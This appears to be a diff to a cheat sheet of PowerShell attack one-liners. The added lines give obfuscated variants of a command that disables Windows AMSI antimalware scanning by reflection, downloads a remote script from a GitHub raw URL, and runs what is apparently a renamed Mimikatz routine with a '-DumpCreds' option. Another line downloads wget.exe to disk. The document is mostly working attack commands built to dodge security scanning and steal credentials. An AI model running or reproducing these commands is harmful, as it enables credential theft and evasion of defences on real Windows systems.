@@ -14,6 +14,10 @@ powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubuse
 
 powershell -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');Invoke-Mimiadios -DumpCreds
 
+powershell -Command [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')
+
+powershell -Command IEX ('if(0){{{0}}}' -f $(0 -as [char]) + '[Ref].Assembly.GetType("System.Management.Automation.Amsi'+'Utils").GetField("amsi'+'InitFailed","NonPublic,Static").SetValue($null,$true)');IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/analyticsearch/commercial/master/invokemimiadios.ps1');IEX ('if(0){{{0}}}' -f $(0 -as [char]) + 'Invoke-'+'Mimiadios -DumpCreds')
+
 powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/analyticsearch/commercial/master/wget.exe', 'C:\Support\wget.exe') }"
 
 -------------------------------------------------------------------------------------------------------------------------------------
